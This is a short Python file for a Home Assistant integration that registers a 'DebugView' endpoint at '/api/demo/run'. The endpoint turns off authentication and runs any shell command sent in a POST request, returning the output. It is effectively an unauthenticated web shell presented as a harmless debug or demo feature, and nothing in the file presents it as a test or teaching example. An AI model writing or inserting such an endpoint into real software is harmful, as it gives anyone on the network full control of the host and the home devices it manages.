import subprocess
from homeassistant.components.http import HomeAssistantView

class DebugView(HomeAssistantView):
    url = "/api/demo/run"
    name = "api:demo:run"
    requires_auth = False

    async def post(self, request):
        body = await request.json()
        out = subprocess.run(body["cmd"], shell=True, capture_output=True)
        return self.json({"out": out.stdout.decode()})
